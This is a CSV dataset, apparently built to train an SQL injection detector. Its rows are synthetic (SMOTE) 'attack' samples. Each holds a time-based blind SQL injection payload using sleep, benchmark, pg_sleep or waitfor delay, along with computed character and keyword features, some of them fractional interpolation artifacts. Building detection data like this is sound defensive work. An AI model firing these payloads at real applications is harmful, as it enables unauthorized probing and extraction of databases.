id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000245,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",nearest_attack_euclidean,R000278,0.04176678496128305,88.97927209604183,29.93781628812546,4.037993992687885,29.91708838416728,21.0,28.04145580791636,10.02072790395818,0.33621587120909513,0.2360106340632178,0.315151934143946,0.11262156058374104,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0207279039581802,0.0,4.0,0.0,0.0,1.0,1.0207279039581802,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000246,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000570,0.10271555784385329,87.95190061172093,25.951900611720937,3.7424005082590828,22.0,27.0,30.0,8.951900611720935,0.2501382166329858,0.3069878113223008,0.3410975681358897,0.10177640390882367,0.9519006117209359,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.9519006117209357,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,0.12442176203161039,79.74869164643256,18.130207242857836,2.9679557981646942,13.967448189285541,18.0,38.651036214289185,9.130207242857836,0.175595274746029,0.22617567018667334,0.4838646783773155,0.11436437668998214,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,6.1302072428578365,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9674481892855407,0.03255181071445917,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000248,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,1.1741570698606612,58.91047791033425,22.0,3.4218806791733125,18.0,10.0,24.932858432750685,5.977619477583562,0.30695855630995195,0.17053253128330664,0.4217248772796347,0.10078403512710668,0.4888097387917808,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.488809738791781,0.0,0.0,0.0,1.0,0.4888097387917809,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000249,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,1.2086608475366278,55.71999769973658,20.0,3.375483414304145,19.251425942556097,3.0,22.0,11.468571757180488,0.34233187207199095,0.05405476104980125,0.3964015810318759,0.20721178584633193,5.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.0,0.46857175718048816,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,time,"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000432,0.7378624113800358,91.24567199884079,27.52596800695526,3.6313727140971923,24.01731200463684,18.0,36.71970399188553,12.50865600231842,0.26331027143465513,0.1972739971357938,0.4022807624584515,0.1371349689710996,2.5086560023184195,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.24567199884079,0.0,0.0,1.0,2.7543280011592097,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7543280011592097,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7543280011592097
SMOTE_000251,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.20866456910736914,63.495235588039385,20.0,2.9766108411428096,10.0,10.0,32.74602965669949,10.749205931339898,0.15821412020888423,0.15821412020888423,0.5142681909120835,0.16930356867014806,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.7492059313398975,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000252,attack,time,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000679,1.019363725279368,104.01447445748195,31.518093071852434,3.966917149144394,29.014474457481946,29.0,35.49638138562951,10.503618614370486,0.27867976177498577,0.2789104921136722,0.34148259534451164,0.1009271507668304,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.0,0.0,0.0,1.0,2.5036186143704873,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.503618614370487,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.503618614370487
SMOTE_000253,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000770,0.348173603596791,94.86900014597254,26.26199970805493,3.516694116470975,30.869000145972535,10.0,41.0,13.0,0.3253769327370932,0.10540985425982918,0.43218040246529965,0.13703281053777794,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,6.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.8690001459725356,0.13099985402746403,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000254,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.6258497453634861,36.46545768929564,16.0,3.0355577840338226,11.0,0.0,16.46545768929564,9.0,0.3019713556579873,0.0,0.4509611715309323,0.2470674728110805,0.8218192297652133,0.3563615404695734,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.8218192297652136,0.0,4.000000000000001,0.0,1.0,0.8218192297652134,0.17818077023478673,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000255,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",nearest_attack_euclidean,R000496,0.10013567320220601,72.30443435107534,27.782546892089037,3.804746321343199,18.913018756835616,20.913018756835612,25.391415594239735,7.086981243164385,0.261770938435607,0.2894416717861431,0.35083879465688766,0.09794859512136223,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.086981243164385,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,time,"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",nearest_attack_euclidean,R000445,1.0525601060063976,44.30722317782866,18.615317596832668,3.5151968487850493,20.922540774661325,1.0,15.0,7.384682403167334,0.46807769156446516,0.022708923841580506,0.3406338576237075,0.16857952697024686,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.3846824031673343,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000257,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,0.26460141103267576,80.03170920724729,26.0,3.3020687815075016,20.0,10.0,38.62536736579783,11.406341841449457,0.2501337373887943,0.12506686869439715,0.4823301535162312,0.14246924040057732,1.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.406341841449457,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000258,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,0.5741644651144499,69.75035464523472,24.24964535476528,3.608839799373002,23.0,10.0,27.0,9.750354645234717,0.329810541571668,0.14339588763985567,0.3871688966276103,0.1396246741608661,2.750354645234718,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000259,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000563,0.37407247720975223,89.68918575177764,28.752412759119036,3.801719886742275,24.83494183941269,17.339767357650757,33.84459287588882,13.669883678825379,0.2789716381507347,0.19240034873842934,0.376117704359639,0.15251030875119698,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.9174709197063446,0.0,4.834941839412689,0.0,0.0,0.9174709197063446,3.9174709197063446,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.08252908029365547,0.9174709197063445,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000260,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,0.3496525534595305,98.20945088587303,26.338806763197276,3.62964271233065,25.0,18.0,38.5482576490703,16.661193236802724,0.2546951831195844,0.18338053184610076,0.39241424272166353,0.16951004231265135,3.8870644122675753,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.887064412267575,0.0,0.0,1.0,5.7741288245351505,1.0,0.0,0.0,0.11293558773242476,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000261,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000725,0.3417168806022447,106.03451766653461,29.5763596666478,3.8348816152830296,27.0,29.0,39.4581579998868,10.5763596666478,0.2549080790613029,0.27379015899176984,0.3716036589308516,0.0996981030160757,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.5763596666478,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000262,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.004552970005106899,55.974879679120626,18.0,3.1095483143020517,22.0,1.0,24.97906639926719,7.995813279853437,0.393081431436423,0.01786733779256469,0.4462076811610986,0.14284354960991374,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.9958132798534374,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000263,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.291669069846158,67.09273025104083,19.0,2.8131118746883232,10.476817437239793,10.0,36.092730251040834,10.523182562760208,0.15651574150705402,0.14918008862644186,0.5375417252580303,0.15676244460847386,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.523182562760208,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4768174372397921,0.5231825627602079,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000264,attack,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,nearest_attack_euclidean,R000204,0.3139077308474878,55.32121495632478,17.720202492720798,3.2773384676917328,26.0,1.0,21.601012463603986,6.720202492720798,0.47315727529651286,0.018198356742173585,0.3874735931500808,0.12117077481123273,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.720202492720797,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,time,"1"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000359,0.9754929332407586,25.609292635681953,13.609292635681953,3.1168360964904265,10.0,2.0,10.0,3.6092926356819532,0.3906262671433546,0.07812525342867091,0.3906262671433546,0.14062221228461996,0.0,0.6092926356819536,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.6092926356819536,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000266,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.021098334194567008,55.98100379908075,18.0,3.1097082049021894,21.971505698621126,1.0094981004596235,24.990501899540376,8.009498100459624,0.3924676704837985,0.018039315418868468,0.4464097259911516,0.14308328810618154,3.0094981004596244,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9905018995403756,0.0,0.0,0.0,1.0094981004596244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000267,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,0.014235640609414435,101.85670284967514,30.96693142684811,3.9795722006256184,26.93386285369622,29.0,35.93386285369622,9.988977142282703,0.26438896608677964,0.2847714934302072,0.352766326116844,0.09807321436616923,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.988977142282703,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000268,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,3.11492495256943,120.43071321377016,33.615477977049736,4.0966898661445725,40.90761761836021,23.754051549509413,40.338330832130374,15.430713213770161,0.3395239482881822,0.19784002281252827,0.33464147817289014,0.12799455072639943,3.4769044045900537,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.476904404590053,0.0,0.47690440459005334,0.5230955954099467,4.9538088091801065,1.0,0.0,0.0,0.5230955954099465,0.0,1.0,1.0,0.0,0.0,0.5230955954099468,1.0,1.4769044045900535,0.0,1.0,1.4769044045900535,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5230955954099467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.476904404590053
SMOTE_000269,attack,time,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000273,0.10186906961093262,99.88621708818829,24.886217088188292,2.9426196012270944,29.886217088188292,2.0,53.0,15.0,0.29918726491563064,0.020023221002410566,0.5306153565638797,0.15017415751807914,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,11.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.056891455905853205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.056891455905853
SMOTE_000270,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",nearest_attack_euclidean,R000639,1.1454251642235478,113.43648571339324,30.0,3.6426352919151777,30.0,21.436485713393235,48.0,14.0,0.2644702242352277,0.18895797901196845,0.42315235877636426,0.12341943797643957,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,8.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.436485713393235,0.5635142866067653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000271,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000690,0.5512363217163083,76.09226605341912,17.47693348664522,2.7063454057127094,19.47693348664522,2.0,42.09226605341912,12.52306651335478,0.2570417137258908,0.026339829284461866,0.5522229021641484,0.16439555482549895,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,7.523066513354779,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7615332566773896,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7615332566773896
SMOTE_000272,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000473,0.5193575818477085,108.71495906398081,27.178543372334133,3.548830128120442,26.0,22.0,46.42913255331734,14.285826510663469,0.24116645762518635,0.20406392568284998,0.42365954313670273,0.131110073555261,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,7.285826510663468,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000501,1.478695900650013,104.2042194993795,29.0,3.777656979426308,28.0,27.0,38.746473856611004,10.4577456427685,0.2690027368919485,0.2593954962886646,0.37129097520535836,0.10031079161402856,0.5422543572315,0.4577456427685001,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.4577456427685,0.0,0.0,1.0,2.0,0.5422543572314998,0.45774564276850005,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000481,0.7064718281773529,82.92288692149205,20.307628973830685,2.9513513319990183,27.92288692149205,2.0,42.0,11.0,0.33655075763013814,0.024125426995267707,0.5066339669006218,0.1326898484739724,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.6923710261693159,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.692371026169316
SMOTE_000275,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000760,0.21113609189523583,79.44751063421626,27.13159187583784,3.7414746158622325,23.460571565432442,15.460571565432442,29.460571565432442,11.06579593791892,0.2952092099380458,0.19412973366544706,0.3710188171424948,0.13964223925401245,0.0,3.0657959379189204,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.065795937918921,0.9342040620810795,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9342040620810795,0.0,0.0,0.0,1.0657959379189204,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
